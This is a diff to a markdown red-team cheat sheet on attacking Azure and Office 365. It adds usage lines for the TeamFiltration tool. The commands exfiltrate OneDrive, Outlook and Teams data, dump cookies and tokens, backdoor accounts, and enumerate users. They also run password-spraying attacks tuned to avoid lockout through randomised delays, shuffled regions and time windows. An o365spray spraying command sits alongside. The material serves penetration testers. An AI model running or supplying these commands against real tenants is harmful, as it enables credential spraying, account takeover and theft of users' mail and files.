@@ -44,6 +44,18 @@
     PS C:> Get-AzureInTuneScript
     PS C:> Show-AzureKeyVaultContent -All
     ```
+* [**Flangvik/TeamFiltration**](https://github.com/Flangvik/TeamFiltration) - TeamFiltration is a cross-platform framework for enumerating, spraying, exfiltrating, and backdooring O365 AAD accounts
+    ```ps1
+    TeamFiltration.exe --outpath  C:\Clients\2023\FooBar\TFOutput --config myCustomConfig.json --exfil --cookie-dump C:\\CookieData.txt --all
+    TeamFiltration.exe --outpath  C:\Clients\2023\FooBar\TFOutput --config myCustomConfig.json --exfil --aad 
+    TeamFiltration.exe --outpath  C:\Clients\2023\FooBar\TFOutput --config myCustomConfig.json --exfil --tokens C:\\OutputTokens.txt --onedrive --owa
+    TeamFiltration.exe --outpath  C:\Clients\2023\FooBar\TFOutput --config myCustomConfig.json --exfil --teams --owa --owa-limit 5000
+    TeamFiltration.exe --outpath  C:\Clients\2023\FooBar\TFOutput --config myCustomConfig.json --debug --exfil --onedrive
+    TeamFiltration.exe --outpath  C:\Clients\2023\FooBar\TFOutput --config myCustomConfig.json --enum --validate-teams
+    TeamFiltration.exe --outpath  C:\Clients\2023\FooBar\TFOutput --config myCustomConfig.json --enum --validate-msol --usernames C:\Clients\2021\FooBar\OSINT\Usernames.txt
+    TeamFiltration.exe --outpath  C:\Clients\2023\FooBar\TFOutput --config myCustomConfig.json --backdoor
+    TeamFiltration.exe --outpath  C:\Clients\2023\FooBar\TFOutput --config myCustomConfig.json --database
+    ```
 * [**Azure/StormSpotter**](https://github.com/Azure/Stormspotter) - :warning: This repository has not been updated recently - Azure Red Team tool for graphing Azure and Azure Active Directory objects
 * [**nccgroup/Azucar**](https://github.com/nccgroup/azucar.git) - :warning: This repository has been archived - Azucar automatically gathers a variety of configuration data and analyses all data relating to a particular subscription in order to determine security risks.
 * [**FSecureLABS/Azurite Explorer**](https://github.com/FSecureLABS/Azurite) - :warning: This repository has not been updated recently - Enumeration and reconnaissance activities in the Microsoft Azure Cloud.
@@ -111,6 +123,12 @@ The default lockout policy tolerates 10 failed attempts, then lock out an accoun
 * [0xZDH/o365spray](https://github.com/0xZDH/o365spray)
     ```powershell
     o365spray --spray -U usernames.txt -P passwords.txt --count 2 --lockout 5 --domain test.com
+    ```
+* [Flangvik/TeamFiltration](https://github.com/Flangvik/TeamFiltration) 
+    ```powershell
+    TeamFiltration.exe --outpath  C:\Clients\2023\FooBar\TFOutput --config myCustomConfig.json --spray --sleep-min 120 --sleep-max 200 --push --shuffle-users --shuffle-regions
+    TeamFiltration.exe --outpath  C:\Clients\2023\FooBar\TFOutput --config myCustomConfig.json --spray --push-locked --months-only --exclude C:\Clients\2021\FooBar\Exclude_Emails.txt
+    TeamFiltration.exe --outpath  C:\Clients\2023\FooBar\TFOutput --config myCustomConfig.json --spray --passwords C:\Clients\2021\FooBar\Generic\Passwords.txt --time-window 13:00-22:00
     ```
 
 ## Azure Services Enumeration
